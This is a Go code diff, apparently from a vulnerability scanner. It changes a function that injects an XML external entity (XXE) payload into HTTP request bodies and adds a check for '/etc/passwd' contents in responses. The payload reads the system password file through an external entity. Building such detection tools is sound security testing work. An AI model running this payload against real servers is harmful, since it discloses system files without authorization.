@@ -7,7 +7,6 @@ import (
 )
 
 const kVulnerability = `
-<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
 	<!ELEMENT foo ANY >
 	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
@@ -25,9 +24,14 @@ func AddVulnerability(req *http.Request) error {
 	}
 
 	if isXML(body) {
-		body = []byte(kVulnerability)
+		idx := bytes.IndexByte(body, '>')
+		body = bytes.Join([][]byte{body[:idx+1], []byte(kVulnerability), body[idx+1:]}, []byte{})
 	}
 
 	req.Body = io.NopCloser(bytes.NewReader(body))
 	return nil
+}
+
+func IsVulnerable(body []byte) bool {
+	return bytes.Contains(body, []byte("root:"))
 }
